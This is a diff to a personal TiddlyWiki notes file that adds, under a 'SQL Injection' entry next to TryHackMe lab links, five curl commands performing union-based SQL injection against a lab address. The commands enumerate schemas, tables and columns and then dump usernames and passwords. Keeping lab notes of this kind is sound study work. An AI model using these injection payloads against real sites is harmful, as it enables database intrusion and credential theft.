@@ -9682,7 +9682,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20210825230930363" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20211101114038483" list="CrappyMakerProgrammer Tech [[Cyber Security]]" modified="20211101132337312" title="$:/StoryList">
+<div created="20211102140937485" list="CrappyMakerProgrammer Tech [[Cyber Security]] Exploitation [[Web Hacking]] [[SQL Injection]]" modified="20211102140948295" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -12059,9 +12059,20 @@ follow symlinks = yes
 wide links = yes
 ```</pre>
 </div>
-<div created="20211101125907368" modified="20211101130513486" title="SQL Injection">
+<div created="20211101125907368" modified="20211102141026060" title="SQL Injection">
 <pre>https://tryhackme.com/room/sqlinjectionlm
-https://tryhackme.com/room/sqlilab</pre>
+https://tryhackme.com/room/sqlilab
+
+```
+
+curl 10.10.10.3/results.php -X POST --data-urlencode &quot;search=Mary' union select 1,2,3,4,5,6 -- -&quot;
+curl 10.10.10.3/results.php -X POST --data-urlencode &quot;search=0' union select distinct 1,2,3,4,5,group_concat(table_schema) FROM information_schema.tables  -- -&quot;
+curl 10.10.10.3/results.php -X POST --data-urlencode &quot;search=0' union select distinct 1,2,3,4,5,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'users' -- -&quot;
+curl 10.10.10.3/results.php -X POST --data-urlencode &quot;search=0' union select 1,2,3,4,5,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'UserDetails' -- -&quot;
+
+curl 10.10.10.3/results.php -X POST --data-urlencode &quot;search=0' union select 1,2,3,4,5,group_concat(username,':',password, SEPARATOR '&lt;br&gt;') FROM users.UserDetails -- -&quot;
+
+```</pre>
 </div>
 <div created="20210810142453194" modified="20210810142954660" title="Stocks">
 <pre>! What are stocks
